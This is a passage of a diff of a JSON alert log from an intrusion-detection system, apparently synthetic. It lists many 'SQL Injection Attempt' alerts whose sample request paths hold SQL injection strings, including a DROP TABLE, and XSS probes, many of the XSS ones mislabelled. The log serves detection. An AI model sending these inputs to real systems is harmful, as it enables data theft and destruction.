-    "timestamp": "2026-02-21T23:59:34.168364",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 125.233.214.139",
-    "evidence": {
-      "source_ip": "125.233.214.139",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<script>alert('xss')</script>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.168468",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 142.252.122.3",
-    "evidence": {
-      "source_ip": "142.252.122.3",
+      "source_ip": "111.147.147.167",
       "attack_count": 1,
       "sample_paths": [
         "/comment?text=<iframe+src='javascript:alert(1)'>"
@@ -1376,38 +817,25 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.168575",
+    "timestamp": "2026-02-24T00:08:44.926144",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 162.207.92.173",
+    "description": "SQL injection attempts detected from 95.23.41.167",
     "evidence": {
-      "source_ip": "162.207.92.173",
+      "source_ip": "95.23.41.167",
       "attack_count": 1,
       "sample_paths": [
-        "/search?q=admin'+--"
+        "/comment?text=<script>alert('xss')</script>"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.168681",
+    "timestamp": "2026-02-24T00:08:44.926230",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 54.90.129.116",
+    "description": "SQL injection attempts detected from 180.89.88.12",
     "evidence": {
-      "source_ip": "54.90.129.116",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+UNION+SELECT+NULL--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.168719",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 207.128.108.163",
-    "evidence": {
-      "source_ip": "207.128.108.163",
+      "source_ip": "180.89.88.12",
       "attack_count": 1,
       "sample_paths": [
         "/search?q='+OR+1=1--"
@@ -1415,38 +843,25 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.168755",
+    "timestamp": "2026-02-24T00:08:44.926323",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 74.16.63.139",
+    "description": "SQL injection attempts detected from 156.105.182.93",
     "evidence": {
-      "source_ip": "74.16.63.139",
+      "source_ip": "156.105.182.93",
       "attack_count": 1,
       "sample_paths": [
-        "/search?q=1'+UNION+SELECT+*+FROM+users--"
+        "/comment?text=<svg/onload=alert('xss')>"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.168790",
+    "timestamp": "2026-02-24T00:08:44.926396",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 55.201.51.219",
+    "description": "SQL injection attempts detected from 5.36.157.136",
     "evidence": {
-      "source_ip": "55.201.51.219",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.168843",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 36.250.23.83",
-    "evidence": {
-      "source_ip": "36.250.23.83",
+      "source_ip": "5.36.157.136",
       "attack_count": 1,
       "sample_paths": [
         "/comment?text=javascript:alert('xss')"
@@ -1454,38 +869,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.168908",
+    "timestamp": "2026-02-24T00:08:44.926466",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 21.62.117.103",
+    "description": "SQL injection attempts detected from 195.104.87.30",
     "evidence": {
-      "source_ip": "21.62.117.103",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=admin'+--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.168959",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 129.93.219.205",
-    "evidence": {
-      "source_ip": "129.93.219.205",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=';+DROP+TABLE+users--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.168996",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 130.44.85.193",
-    "evidence": {
-      "source_ip": "130.44.85.193",
+      "source_ip": "195.104.87.30",
       "attack_count": 1,
       "sample_paths": [
         "/comment?text=<body+onload=alert('xss')>"
@@ -1493,64 +882,64 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169031",
+    "timestamp": "2026-02-24T00:08:44.926558",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 107.18.106.38",
+    "description": "SQL injection attempts detected from 146.44.127.93",
     "evidence": {
-      "source_ip": "107.18.106.38",
+      "source_ip": "146.44.127.93",
       "attack_count": 1,
       "sample_paths": [
-        "/comment?text=<script>alert('xss')</script>"
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169066",
+    "timestamp": "2026-02-24T00:08:44.926629",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 46.160.147.227",
+    "description": "SQL injection attempts detected from 21.242.81.30",
     "evidence": {
-      "source_ip": "46.160.147.227",
+      "source_ip": "21.242.81.30",
       "attack_count": 1,
       "sample_paths": [
-        "/comment?text=<svg/onload=alert('xss')>"
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169100",
+    "timestamp": "2026-02-24T00:08:44.926712",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 94.119.45.23",
+    "description": "SQL injection attempts detected from 32.165.160.242",
     "evidence": {
-      "source_ip": "94.119.45.23",
+      "source_ip": "32.165.160.242",
       "attack_count": 1,
       "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169134",
+    "timestamp": "2026-02-24T00:08:44.926778",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 191.75.42.181",
+    "description": "SQL injection attempts detected from 86.49.163.76",
     "evidence": {
-      "source_ip": "191.75.42.181",
+      "source_ip": "86.49.163.76",
       "attack_count": 1,
       "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
+        "/search?q=admin'+--"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169168",
+    "timestamp": "2026-02-24T00:08:44.926849",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 201.97.56.72",
+    "description": "SQL injection attempts detected from 120.24.237.210",
     "evidence": {
-      "source_ip": "201.97.56.72",
+      "source_ip": "120.24.237.210",
       "attack_count": 1,
       "sample_paths": [
         "/search?q='+OR+1=1--"
@@ -1558,155 +947,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169202",
+    "timestamp": "2026-02-24T00:08:44.926917",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 23.33.250.40",
+    "description": "SQL injection attempts detected from 35.45.73.211",
     "evidence": {
-      "source_ip": "23.33.250.40",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'1'='1"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169236",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 169.243.176.88",
-    "evidence": {
-      "source_ip": "169.243.176.88",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<svg/onload=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169271",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 118.190.250.60",
-    "evidence": {
-      "source_ip": "118.190.250.60",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=admin'+--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169306",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 141.228.244.3",
-    "evidence": {
-      "source_ip": "141.228.244.3",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<iframe+src='javascript:alert(1)'>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169340",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 208.223.113.185",
-    "evidence": {
-      "source_ip": "208.223.113.185",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<iframe+src='javascript:alert(1)'>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169374",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 82.146.1.143",
-    "evidence": {
-      "source_ip": "82.146.1.143",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<svg/onload=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169408",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 42.34.217.247",
-    "evidence": {
-      "source_ip": "42.34.217.247",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<script>alert('xss')</script>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169442",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 152.151.233.83",
-    "evidence": {
-      "source_ip": "152.151.233.83",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=1'+AND+'1'='1"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169476",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 73.211.52.212",
-    "evidence": {
-      "source_ip": "73.211.52.212",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'1'='1"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169510",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 163.145.225.221",
-    "evidence": {
-      "source_ip": "163.145.225.221",
-      "attack_count": 1,
-      "sample_paths": [
-        "/comment?text=<svg/onload=alert('xss')>"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169563",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 137.102.172.174",
-    "evidence": {
-      "source_ip": "137.102.172.174",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+UNION+SELECT+NULL--"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.169601",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 43.175.44.168",
-    "evidence": {
-      "source_ip": "43.175.44.168",
+      "source_ip": "35.45.73.211",
       "attack_count": 1,
       "sample_paths": [
         "/comment?text=<body+onload=alert('xss')>"
@@ -1714,25 +960,25 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169637",
+    "timestamp": "2026-02-24T00:08:44.926997",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 46.157.144.56",
+    "description": "SQL injection attempts detected from 25.105.141.240",
     "evidence": {
-      "source_ip": "46.157.144.56",
+      "source_ip": "25.105.141.240",
       "attack_count": 1,
       "sample_paths": [
-        "/comment?text=<img+src=x+onerror=alert('xss')>"
+        "/search?q=';+DROP+TABLE+users--"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.169670",
+    "timestamp": "2026-02-24T00:08:44.927075",
     "rule": "SQL Injection Attempt",
     "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 134.78.32.155",
+    "description": "SQL injection attempts detected from 11.21.138.108",
     "evidence": {
-      "source_ip": "134.78.32.155",
+      "source_ip": "11.21.138.108",
       "attack_count": 1,
       "sample_paths": [
         "/search?q='+OR+'1'='1"
@@ -1740,372 +986,1126 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.192219",
+    "timestamp": "2026-02-24T00:08:44.927165",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 197.78.206.145",
+    "evidence": {
+      "source_ip": "197.78.206.145",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<body+onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927220",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 39.223.159.109",
+    "evidence": {
+      "source_ip": "39.223.159.109",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<svg/onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927298",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 131.25.96.130",
+    "evidence": {
+      "source_ip": "131.25.96.130",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=';+DROP+TABLE+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927375",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 180.234.192.15",
+    "evidence": {
+      "source_ip": "180.234.192.15",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<svg/onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927428",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 148.7.192.125",
+    "evidence": {
+      "source_ip": "148.7.192.125",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=';+DROP+TABLE+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927473",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 57.197.228.205",
+    "evidence": {
+      "source_ip": "57.197.228.205",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'1'='1"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927514",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 199.219.103.254",
+    "evidence": {
+      "source_ip": "199.219.103.254",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=admin'+--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927620",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 146.2.110.232",
+    "evidence": {
+      "source_ip": "146.2.110.232",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'x'='x"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927740",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 202.42.68.176",
+    "evidence": {
+      "source_ip": "202.42.68.176",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=1'+UNION+SELECT+*+FROM+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927799",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 9.83.125.28",
+    "evidence": {
+      "source_ip": "9.83.125.28",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'1'='1"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.927959",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 21.184.155.58",
+    "evidence": {
+      "source_ip": "21.184.155.58",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=admin'+--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928028",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 80.253.17.223",
+    "evidence": {
+      "source_ip": "80.253.17.223",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=javascript:alert('xss')"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928103",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 166.142.200.189",
+    "evidence": {
+      "source_ip": "166.142.200.189",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'1'='1"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928283",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 8.198.125.45",
+    "evidence": {
+      "source_ip": "8.198.125.45",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<img+src=x+onerror=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928528",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 93.248.171.95",
+    "evidence": {
+      "source_ip": "93.248.171.95",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=1'+UNION+SELECT+*+FROM+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928682",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 107.18.127.15",
+    "evidence": {
+      "source_ip": "107.18.127.15",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<svg/onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928812",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 132.15.226.210",
+    "evidence": {
+      "source_ip": "132.15.226.210",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'1'='1"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928889",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 209.103.244.127",
+    "evidence": {
+      "source_ip": "209.103.244.127",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'x'='x"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.928949",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 11.127.55.4",
+    "evidence": {
+      "source_ip": "11.127.55.4",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+1=1--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929103",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 91.208.137.216",
+    "evidence": {
+      "source_ip": "91.208.137.216",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'1'='1"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929261",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 77.195.246.50",
+    "evidence": {
+      "source_ip": "77.195.246.50",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=1'+UNION+SELECT+*+FROM+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929332",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 83.38.34.93",
+    "evidence": {
+      "source_ip": "83.38.34.93",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=javascript:alert('xss')"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929455",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 192.55.248.116",
+    "evidence": {
+      "source_ip": "192.55.248.116",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=javascript:alert('xss')"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929526",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 155.132.25.51",
+    "evidence": {
+      "source_ip": "155.132.25.51",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+UNION+SELECT+NULL--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929669",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 98.54.28.234",
+    "evidence": {
+      "source_ip": "98.54.28.234",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+1=1--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929736",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 179.113.131.251",
+    "evidence": {
+      "source_ip": "179.113.131.251",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'x'='x"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929863",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 124.79.124.87",
+    "evidence": {
+      "source_ip": "124.79.124.87",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+1=1--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.929961",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 62.220.234.235",
+    "evidence": {
+      "source_ip": "62.220.234.235",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930081",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 167.239.113.240",
+    "evidence": {
+      "source_ip": "167.239.113.240",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=javascript:alert('xss')"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930218",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 53.82.192.170",
+    "evidence": {
+      "source_ip": "53.82.192.170",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'x'='x"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930355",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 48.238.247.114",
+    "evidence": {
+      "source_ip": "48.238.247.114",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930432",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 9.53.212.95",
+    "evidence": {
+      "source_ip": "9.53.212.95",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930549",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 102.250.143.151",
+    "evidence": {
+      "source_ip": "102.250.143.151",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'1'='1"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930688",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 22.248.119.96",
+    "evidence": {
+      "source_ip": "22.248.119.96",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=admin'+--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930757",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 38.92.24.28",
+    "evidence": {
+      "source_ip": "38.92.24.28",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=javascript:alert('xss')"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.930835",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 100.192.122.9",
+    "evidence": {
+      "source_ip": "100.192.122.9",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=1'+UNION+SELECT+*+FROM+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931084",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 197.114.202.134",
+    "evidence": {
+      "source_ip": "197.114.202.134",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=';+DROP+TABLE+users--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931244",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 219.94.80.111",
+    "evidence": {
+      "source_ip": "219.94.80.111",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<body+onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931297",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 103.216.59.50",
+    "evidence": {
+      "source_ip": "103.216.59.50",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=javascript:alert('xss')"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931373",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 185.193.131.205",
+    "evidence": {
+      "source_ip": "185.193.131.205",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<script>alert('xss')</script>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931413",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 9.28.91.70",
+    "evidence": {
+      "source_ip": "9.28.91.70",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<body+onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931474",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 93.70.29.251",
+    "evidence": {
+      "source_ip": "93.70.29.251",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+'1'='1"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931535",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 210.127.135.226",
+    "evidence": {
+      "source_ip": "210.127.135.226",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+1=1--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931589",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 74.178.221.199",
+    "evidence": {
+      "source_ip": "74.178.221.199",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q=admin'+--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931639",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 99.154.176.144",
+    "evidence": {
+      "source_ip": "99.154.176.144",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<svg/onload=alert('xss')>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931685",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 33.132.225.83",
+    "evidence": {
+      "source_ip": "33.132.225.83",
+      "attack_count": 1,
+      "sample_paths": [
+        "/search?q='+OR+1=1--"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931726",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 218.245.60.6",
+    "evidence": {
+      "source_ip": "218.245.60.6",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931769",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 217.2.100.114",
+    "evidence": {
+      "source_ip": "217.2.100.114",
+      "attack_count": 1,
+      "sample_paths": [
+        "/comment?text=<iframe+src='javascript:alert(1)'>"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.931809",
+    "rule": "SQL Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "SQL injection attempts detected from 32.118.243.201",
+    "evidence": {
+      "source_ip": "32.118.243.201",
